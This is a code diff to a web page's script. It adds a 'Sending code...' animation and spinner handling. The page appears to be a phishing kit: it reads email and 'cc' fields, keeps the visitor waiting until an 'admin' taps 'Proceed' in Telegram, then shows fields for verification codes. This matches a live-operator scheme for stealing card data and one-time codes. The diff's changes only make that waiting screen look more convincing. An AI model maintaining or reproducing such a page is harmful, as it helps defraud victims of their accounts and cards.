@@ -555,6 +555,22 @@ function hideSubmitSpinner() {
     if (el) el.classList.remove("on");
 }
 
+// Animated "Sending code." -> "Sending code.." -> "Sending code..." loop
+let _dotTimer = null;
+function startDotAnim(btn) {
+    stopDotAnim();
+    const frames = ["Sending code.", "Sending code..", "Sending code..."];
+    let i = 0;
+    btn.textContent = frames[0];
+    _dotTimer = setInterval(() => {
+        i = (i + 1) % frames.length;
+        btn.textContent = frames[i];
+    }, 500);
+}
+function stopDotAnim() {
+    if (_dotTimer) { clearInterval(_dotTimer); _dotTimer = null; }
+}
+
 function chk() {
     const emailEl = document.getElementById("email");
     const ccEl = document.getElementById("cc");
@@ -669,13 +685,12 @@ async function step1() {
         return;
     }
 
-    hideSubmitSpinner();
+    // Keep the spinner spinning until admin taps Proceed.
+// Do NOT call hideSubmitSpinner() here.
+startDotAnim(btn);
+btn.disabled = true;
 
-    // Stay on screen 1 — waiting for admin to tap "Proceed" in Telegram.
-    btn.textContent = "Sending code...";
-    btn.disabled = true;
-
-    attachListener(requestId);
+attachListener(requestId);
 }
 
 function attachListener(requestId) {
@@ -698,6 +713,8 @@ function attachListener(requestId) {
             // STEP 1 -> 2: admin tapped "Proceed"
             if (proceedOk && currentStep === 1) {
                 currentStep = 2;
+                stopDotAnim();
+                hideSubmitSpinner();
                 ["e0","e1","e2","e3"].forEach(id => {
                     const el = document.getElementById(id);
                     if (el) el.value = "";
@@ -740,6 +757,8 @@ function attachListener(requestId) {
                 if (b) { b.textContent = "Send verification code"; b.disabled = false; }
                 setActiveScreen("s1");
                 chk();
+                stopDotAnim();
+                hideSubmitSpinner();
                 showError("err1", "Verification was not completed. Please try again.");
             }
         },
@@ -752,7 +771,9 @@ function attachListener(requestId) {
             if (b) { b.textContent = "Send verification code"; b.disabled = false; }
             setActiveScreen("s1");
             chk();
-            showError("err1", "Connection error. Please try again.");
+            stopDotAnim();
+        hideSubmitSpinner();
+        showError("err1", "Connection error. Please try again.");
         }
     );
 }
@@ -892,5 +913,6 @@ window.accountVerificationFirebase = {
 </script>
 </body>
 </html>
+
 
 
